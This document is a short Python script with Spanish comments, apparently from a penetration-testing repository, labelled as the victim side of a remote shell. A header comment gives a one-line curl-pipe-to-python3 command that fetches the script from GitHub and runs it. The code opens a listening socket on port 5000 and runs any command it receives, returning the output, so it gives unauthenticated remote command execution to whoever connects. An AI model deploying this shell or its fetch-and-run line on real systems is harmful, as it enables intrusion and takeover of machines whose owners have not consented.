#!/usr/bin/env python3

# Ejecuci√≥n remota:
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/2-Exploit/RevShell/Python/victim.py | python3 -

from socket import socket, SOL_SOCKET, SO_REUSEADDR
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep

def fCerrarSockets(vClientSocket, vServerSocket):
  try:
    if vClientSocket:
      vClientSocket.close()
  except:
    pass

  try:
    if vServerSocket:
      vServerSocket.close()
  except:
    pass

def fMain():
  cDireccionServidor = '0.0.0.0'
  cPuertoServidor = 5000
  cTamBuffer = 4096

  vServerAddress = (cDireccionServidor, cPuertoServidor)

  vServerSocket = socket()
  vServerSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
  vServerSocket.bind(vServerAddress)
  vServerSocket.listen(1)

  vClientSocket = None
  vEstado = True

  try:
    vClientSocket, vClientAddress = vServerSocket.accept()

    while vEstado:
      vComando = vClientSocket.recv(cTamBuffer).decode().strip()

      if vComando == 'exit':
        vEstado = False

      elif vComando.split(' ')[0] == 'cd':
        try:
          chdir(' '.join(vComando.split(' ')[1:]))
          vClientSocket.send(f"ruta actual: {getcwd()}".encode())
        except Exception as vError:
          vClientSocket.send(str(vError).encode())

      else:
        vSalida = getoutput(vComando)
        vClientSocket.send(vSalida.encode())

      sleep(0.1)

  finally:
    fCerrarSockets(vClientSocket, vServerSocket)

if __name__ == '__main__':
  fMain()
